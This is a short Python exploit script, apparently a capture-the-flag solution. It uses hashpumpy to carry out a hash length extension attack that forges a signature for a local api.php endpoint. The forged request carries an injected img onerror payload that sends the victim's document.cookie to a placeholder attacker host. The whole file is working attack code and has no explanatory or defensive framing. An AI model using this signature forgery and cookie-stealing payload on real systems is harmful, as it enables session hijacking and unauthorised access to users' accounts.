#!/usr/bin/python3
import hashpumpy
from base64 import b64encode

def b64(s):
    return b64encode(s.encode()).decode()

def api(name, p1, p2):
    return "%s,%s,%s" % (b64(name), b64(p1), b64(p2))


def hash_ext(extra):
    orig_hash = "4a6d41445095cf6ae3daf76567dc8ce7"
    known_msg = "Ym9keQ==,aGk=,aGk="
    hash, msg = hashpumpy.hashpump(orig_hash, known_msg, extra, 12)
    return hash, b64encode(msg).decode()

def main():
    test = [api("body", "<img src='", ""),
            api("body", "' onerror='location.href=\"{{attacker_host}}/\"+document.cookie;'>", ""),
            api("header", "HTTP/1 404", "value")]
    ex = "|" + "|".join(test)
    
    sig, q = hash_ext(ex)
    print("http://127.0.0.1/api.php?sig=%s&q=%s" % (sig, q))

if __name__ == '__main__':
    main()
